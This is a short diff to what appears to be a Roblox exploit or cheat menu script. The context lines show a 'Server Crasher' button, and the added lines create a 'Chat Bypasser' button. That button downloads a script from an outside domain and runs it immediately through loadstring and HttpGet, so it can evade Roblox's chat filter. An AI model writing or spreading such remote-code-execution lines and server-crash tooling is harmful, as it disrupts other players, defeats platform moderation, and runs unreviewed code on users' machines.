@@ -452,6 +452,9 @@ Section:NewButton("Server Crasher", "Needs R15, might not work sometimes.", func
     end
 end
 end)
+Section:NewButton("Chat Bypasser", "no more of that ####", function()
+    loadstring(game:HttpGet("https://the-shed.xyz/roblox/scripts/ChatBypass", true))()
+end)
 local Tab = Window:NewTab("Animations")
 local Section = Tab:NewSection("Animations")
 Section:NewButton("Ender", "Makes your character smash.", function()
